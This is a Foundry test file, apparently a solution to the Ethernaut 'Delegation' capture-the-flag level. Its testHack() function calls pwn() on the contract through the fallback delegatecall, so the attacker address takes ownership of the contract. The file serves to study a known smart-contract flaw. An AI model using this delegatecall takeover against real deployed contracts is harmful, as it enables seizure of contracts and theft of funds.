// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "src/Delegation.sol";
import "forge-std/Test.sol";


contract DelegationTest is Test {
    Delegation private delegation;
    Delegate private delegate;
    address private constant HACKER = address(0x1);
    function setUp() external {
        delegate = new Delegate(address(this));
        delegation = new Delegation(address(delegate));

        vm.deal(HACKER, 2e18);
        vm.startPrank(HACKER);
    }

    function testHack() external {
        (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "tx failed");

        assertEq(delegation.owner(), HACKER);
    }
}